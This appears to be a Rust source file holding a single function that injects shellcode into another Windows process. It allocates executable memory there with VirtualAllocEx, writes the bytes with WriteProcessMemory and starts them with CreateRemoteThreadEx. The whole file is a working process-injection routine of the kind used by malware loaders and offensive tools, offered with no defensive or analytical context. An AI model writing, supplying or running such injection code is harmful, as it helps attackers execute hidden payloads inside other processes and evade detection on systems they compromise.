use windows::core::{Error, Result};
use windows::Win32::Foundation::{CloseHandle, E_INVALIDARG, HANDLE, WAIT_OBJECT_0};
use windows::Win32::System::Memory::{
    VirtualAllocEx, VirtualFreeEx, MEM_COMMIT, MEM_RELEASE, MEM_RESERVE, PAGE_EXECUTE_READWRITE,
};
use windows::Win32::System::Threading::{CreateRemoteThreadEx, WaitForSingleObject, INFINITE};

pub fn inject_shellcode(handle: HANDLE, shellcode: &[u8]) -> Result<()> {
    if shellcode.is_empty() {
        return Err(Error::from_hresult(E_INVALIDARG));
    }

    // Allocate memory in remote process
    let remote_memory = unsafe {
        VirtualAllocEx(
            handle,
            None,
            shellcode.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        )
    };

    if remote_memory.is_null() {
        return Err(Error::from_thread());
    }

    // Write shellcode to remote process memory
    let mut bytes_written = 0usize;
    let write_result = unsafe {
        windows::Win32::System::Diagnostics::Debug::WriteProcessMemory(
            handle,
            remote_memory,
            shellcode.as_ptr() as _,
            shellcode.len(),
            Some(&mut bytes_written),
        )
    };

    if write_result.is_err() || bytes_written != shellcode.len() {
        let _ = unsafe { VirtualFreeEx(handle, remote_memory, 0, MEM_RELEASE) };
        return Err(Error::from_thread());
    }

    // Create remote thread to execute shellcode
    let thread_handle = unsafe {
        CreateRemoteThreadEx(
            handle,
            None,
            0,
            Some(std::mem::transmute::<
                *mut std::ffi::c_void,
                unsafe extern "system" fn(*mut std::ffi::c_void) -> u32,
            >(remote_memory)),
            None,
            0,
            None,
            None,
        )
    };

    let thread_handle = match thread_handle {
        Ok(handle) => handle,
        Err(e) => {
            let _ = unsafe { VirtualFreeEx(handle, remote_memory, 0, MEM_RELEASE) };
            return Err(e);
        }
    };

    // Wait for thread completion
    let wait_result = unsafe { WaitForSingleObject(thread_handle, INFINITE) };
    if wait_result != WAIT_OBJECT_0 {
        let _ = unsafe { CloseHandle(thread_handle) };
        let _ = unsafe { VirtualFreeEx(handle, remote_memory, 0, MEM_RELEASE) };
        return Err(Error::from_thread());
    }

    // Cleanup resources
    let _ = unsafe { CloseHandle(thread_handle) };
    let _ = unsafe { VirtualFreeEx(handle, remote_memory, 0, MEM_RELEASE) };

    Ok(())
}
